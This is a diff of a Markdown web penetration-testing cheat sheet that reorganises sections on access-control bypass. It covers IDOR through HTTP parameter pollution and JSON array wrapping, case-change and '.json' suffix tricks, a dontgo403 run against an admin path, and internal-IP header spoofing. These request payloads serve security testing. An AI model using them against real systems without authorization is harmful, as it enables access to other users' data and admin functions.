@@ -429,8 +429,8 @@ https://github.com/internetwache/GitTools
 #### IDOR + Parameter Pollution
 ##### HTTP Parameter Pollution
 ```
-GET /api/v1/messages?id=<Another_User_ID> # unauthourized
-GET /api/v1/messages?id=<You_User_ID>&id=<Another_User_ID> # authorized
+GET /api/v1/messages?id=<Another_User_ID> #unauthourized
+GET /api/v1/messages?id=<You_User_ID>&id=<Another_User_ID> #authorized
 GET /api/v1/messages?id[]=<Your_User_ID>&id[]=<Another_User_ID>
 ```
 	
@@ -446,21 +446,17 @@ POST /api/v1/messages
 {"user_id":{"user_id":<Anoher_User_id>}} 
 ```
 
+#### Authorization Bypass
 -> with array  
 ```
 {"user_id":001} #Unauthorized
 {"user_id":[001]} #Authorized
 ```
 
-#### UUIDv1
-https://caon.io/exploitation/vulnerability/other/uuid/
-https://github.com/felipecaon/uuidv1gen
-
-#### Others
 -> add .json if in ruby
 ```
-GET /user/1029 # Unauthorized
-GET /user/1029.json # Authorized
+GET /user/1029 #Unauthorized
+GET /user/1029.json #Authorized
 ```
 
 -> Random Case
@@ -468,6 +464,16 @@ GET /user/1029.json # Authorized
 GET /admin/profile #Unauthorized
 GET /ADMIN/profile #Authorized
 ```
+
+-> 403 Bypass 
+```
+./dontgo403 -u http://site.com/admin
+```
+https://github.com/devploit/dontgo403
+
+#### UUIDv1
+https://caon.io/exploitation/vulnerability/other/uuid/
+https://github.com/felipecaon/uuidv1gen
 
 ### Spoofing Internal IP in Request Header
 ```
@@ -484,12 +490,6 @@ True-Client-IP: 127.0.0.1
 X-Custom-IP-Authorization: 127.0.0.1
 ```
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/headers_internal_bypass.txt
-
-### 403 Bypass 
-```
-./dontgo403 -u http://site.com/admin
-```
-https://github.com/devploit/dontgo403
 
 ## Type Juggling and Hash Collision
 https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf  
@@ -551,7 +551,7 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 -> Detect via Response Simple in SOAP Message
 ```
 POST /endpoint HTTP/1.1
-Host: <ip>:<port>
+Host: <IP>:<port>
 
 <SOAP:Envelope>
 </SOAP:Envelope>
